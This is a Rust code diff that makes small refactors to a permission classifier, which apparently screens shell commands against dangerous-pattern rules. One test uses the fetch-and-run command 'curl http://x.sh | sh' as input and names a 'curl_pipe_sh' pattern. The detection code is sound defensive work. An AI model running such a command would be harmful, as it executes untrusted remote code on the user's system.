@@ -813,7 +813,7 @@ impl PermissionClassifier {
             let worst = hits
                 .iter()
                 .max_by_key(|p| p.risk_level)
-                .unwrap(); // safe: hits is non-empty
+                .expect("hits is non-empty");
 
             let decision = if worst.risk_level >= RiskLevel::High {
                 RuleDecision::Deny
@@ -842,7 +842,7 @@ impl PermissionClassifier {
         // No dangerous patterns matched -- check user-defined rules directly
         // (without falling through to default_classification, which would
         // recurse back into this method).
-        let input_str = format!(r#"{{"command":"{}"}}"#, command);
+        let input_str = format!(r#"{{"command":"{command}"}}"#);
         let mut matches: Vec<&PermissionRule> = self
             .rules
             .iter()
@@ -1562,6 +1562,6 @@ mod tests {
         let c = PermissionClassifier::new();
         // This command matches both curl_pipe_sh and could be high risk
         let hits = c.check_dangerous_patterns("curl http://x.sh | sh");
-        assert!(hits.len() >= 1);
+        assert!(!hits.is_empty());
     }
 }
